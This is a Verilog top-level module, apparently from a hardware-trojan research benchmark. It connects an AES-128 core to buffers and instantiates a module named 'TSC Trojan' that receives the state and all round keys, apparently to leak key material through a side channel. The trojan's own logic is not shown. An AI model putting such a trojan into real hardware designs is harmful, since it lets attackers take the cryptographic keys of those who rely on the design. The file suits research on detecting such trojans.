`timescale 1ns / 1ps
//////////////////////////////////////////////////////////////////////////////////
// Company:
// Engineer:
//
// Create Date:    12:02:52 03/06/2013
// Design Name:
// Module Name:    top
// Project Name:
// Target Devices:
// Tool versions:
// Description:
//
// Dependencies:
//
// Revision:
// Revision 0.01 - File Created
// Additional Comments:
//
//////////////////////////////////////////////////////////////////////////////////
module top(
    input clk,
    input rst,
    output [7:0] res);
    reg [63:0] state;
    reg [63:0] key;
    reg [63:0] result;
    wire [63:0] Capacitance;

    wire [63:0] statew;
    wire [63:0] keyw;

    wire [127:0] statebi;
    wire [127:0] keybi;
    wire [127:0] out;

    wire [127:0] rk1, rk2, rk3, rk4, rk5, rk6, rk7, rk8;

    always @(posedge clk)
    begin
      state <= 64'd0;
      key <= 64'd0;;
    end

    assign statew = state;
    assign keyw = key;


    bufferin bi(.clk(clk)
    ,.statein(statew)
    ,.keyin(keyw)
    ,.stateout(statebi)
    ,.keyout(keybi));


	aes_128 AES  (clk, statebi, keybi, out, rk1, rk2, rk3, rk4, rk5, rk6, rk7, rk8);
	TSC Trojan (rst, clk, statebi, rk1, rk2, rk3, rk4, rk5, rk6, rk7, rk8);

    bufferout bo(.clk(clk)
      ,.resultin(out)
      ,.resultout(res));

endmodule
